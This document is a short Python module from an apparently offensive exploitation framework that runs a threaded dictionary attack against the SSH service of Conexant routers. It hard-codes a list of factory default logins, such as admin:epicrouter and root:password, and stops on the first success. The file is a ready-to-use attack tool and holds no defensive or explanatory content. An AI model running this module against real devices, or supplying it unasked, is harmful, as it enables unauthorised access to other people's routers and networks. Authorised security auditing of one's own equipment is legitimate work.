# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    __info__ = {
        "name": "Conexant Router Default SSH Creds",
        "description": "Dictionary attack with default credentials against Conexant Router SSH service.",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Conexant Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:epicrouter,admin:password,admin:root,root:epicrouter,root:password", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid attempt")
    verbosity = OptBool(True, "Display attempts")
